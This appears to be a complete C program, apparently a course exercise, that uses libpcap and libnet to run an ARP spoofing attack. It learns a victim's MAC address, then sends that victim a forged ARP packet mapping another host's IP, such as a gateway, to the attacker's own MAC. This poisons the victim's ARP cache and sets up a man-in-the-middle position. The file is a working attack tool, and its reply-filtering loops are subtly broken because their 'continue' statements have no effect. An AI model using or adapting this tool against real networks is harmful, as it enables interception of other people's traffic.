#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <libnet.h>

#define ARPPRO_IPV4 0x0800
#define IP_ADDR_LEN 4
#define ARP_PACKET_LEN 42	//eth_h 14 + arp_h 8 + arp_a 20

struct arp_addr{
	uint8_t ar_sha[ETHER_ADDR_LEN];
	uint8_t ar_sip[IP_ADDR_LEN];
	uint8_t ar_tha[ETHER_ADDR_LEN];
	uint8_t ar_tip[IP_ADDR_LEN];
};

void usage(){
	printf("syntax: ./send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int send_arp_req(pcap_t * handle, uint8_t * buf, uint8_t* src_mac, uint8_t* dst_mac, uint8_t* sender_ip, uint8_t* target_ip){	
	struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr*)buf;
	struct libnet_arp_hdr * arp_h = (struct libnet_arp_hdr*)(eth_h+1);
	struct arp_addr * arp_a = (struct arp_addr*)(arp_h+1);

	for(int i=0; i<ETHER_ADDR_LEN; i++){
		eth_h -> ether_dhost[i] = dst_mac[i];
		eth_h -> ether_shost[i] = src_mac[i];
	}
	eth_h -> ether_type = htons(ETHERTYPE_ARP);
	arp_h -> ar_hrd = htons(ARPHRD_ETHER);
	arp_h -> ar_pro = htons(ARPPRO_IPV4);
	arp_h -> ar_hln = ETHER_ADDR_LEN;
	arp_h -> ar_pln = IP_ADDR_LEN;
	arp_h -> ar_op = htons(ARPOP_REQUEST);
	
	for(int i=0; i<ETHER_ADDR_LEN; i++)
		arp_a -> ar_sha[i] = src_mac[i];
		//ar_tha = 00:00:00:00:00:00
	for(int i=0; i<IP_ADDR_LEN; i++){
		arp_a -> ar_sip[i] = sender_ip[i];
		arp_a -> ar_tip[i] = target_ip[i];
	}

	if (pcap_sendpacket(handle, buf, ARP_PACKET_LEN) == -1){
		printf("arp request failed\n");
		return -1;
	}
	return 1;
}

int get_arp_rep(pcap_t* handle, uint8_t* my_mac, uint8_t* my_ip, uint8_t* sender_mac){
	while (true) {
		struct pcap_pkthdr* header;
		const uint8_t* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2){
			printf("error while reading packet\n");
			return -1;
		}

		struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr*)packet;
		if(ntohs(eth_h -> ether_type) != ETHERTYPE_ARP) continue;

		struct libnet_arp_hdr * arp_h = (struct libnet_arp_hdr*)(eth_h+1);
		struct arp_addr * arp_a = (struct arp_addr*)(arp_h+1);
		if(ntohs(arp_h -> ar_op) != ARPOP_REPLY) continue;
	
		for(int i=0; i<ETHER_ADDR_LEN; i++)
			if(arp_a -> ar_tha[i] != my_mac[i]) continue;
	
		for(int i=0; i< IP_ADDR_LEN; i++)
			if(arp_a -> ar_tip[i] != my_ip[i]) continue;
	
		for(int i=0; i<ETHER_ADDR_LEN; i++)
			sender_mac[i] = arp_a -> ar_sha[i];
		
		return 1;
	}
}

int get_my_addr(const char* dev, uint8_t * my_mac, uint8_t* my_ip){
	struct ifreq ifrq;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	
	strcpy(ifrq.ifr_name, dev);

	if(ioctl(s,SIOCGIFHWADDR, &ifrq) <0){
		printf("Failed to get mac addr\n");
		return -1;
	}
	for(int i=0; i<ETHER_ADDR_LEN; i++)
		my_mac[i] = (uint8_t)ifrq.ifr_hwaddr.sa_data[i];

	if (ioctl(s, SIOCGIFADDR, &ifrq) <0){
		printf("Failed to get ip addr\n");
		return -1;
	}
	*(in_addr*)my_ip = ((sockaddr_in*)&ifrq.ifr_addr)->sin_addr;
	
	return 1;
}

int main(int argc, char * argv[]){
	if(argc != 4){
		usage();
		return -1;
	}
	
	char errbuf[PCAP_ERRBUF_SIZE];
	char * dev = argv[1];
	uint8_t brdcst_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
	uint8_t my_mac[6], sender_mac[6];
	uint8_t my_ip[4], sender_ip[4], target_ip[4];
	uint8_t buf[ARP_PACKET_LEN]={0};

	inet_pton(AF_INET, argv[2], sender_ip);
	inet_pton(AF_INET, argv[3], target_ip);

	if (get_my_addr(dev, my_mac, my_ip) == -1) return -1;

	pcap_t * handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	if (send_arp_req(handle, buf, my_mac, brdcst_mac, my_ip, sender_ip) == -1) return -1;
	if (get_arp_rep(handle,my_mac,my_ip,sender_mac) == -1) return -1;
	if (send_arp_req(handle, buf, my_mac, sender_mac, target_ip, sender_ip) == -1) return -1;
	
	printf("Done\n");
	pcap_close(handle);
	return 0;
}

